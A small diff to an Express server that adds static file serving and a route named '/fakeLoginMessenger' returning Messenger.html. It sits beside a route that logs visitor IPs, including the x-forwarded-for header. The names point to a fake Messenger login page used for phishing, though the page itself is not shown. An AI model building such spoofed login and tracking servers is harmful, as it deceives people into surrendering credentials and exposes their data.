@@ -4,6 +4,14 @@ const path = require("path");
 const fs = require("fs");
 const writer = fs.createWriteStream("log.txt");
 
+
+app.use(express.static("public"));
+
+app.get("/fakeLoginMessenger", function (req, res) {
+  res.sendFile(path.join(__dirname, "Messenger.html"));
+});
+
+
 app.get("/blind", function (req, res) {
   const forwarded = req.headers["x-forwarded-for"];
   const ip = req.ip;
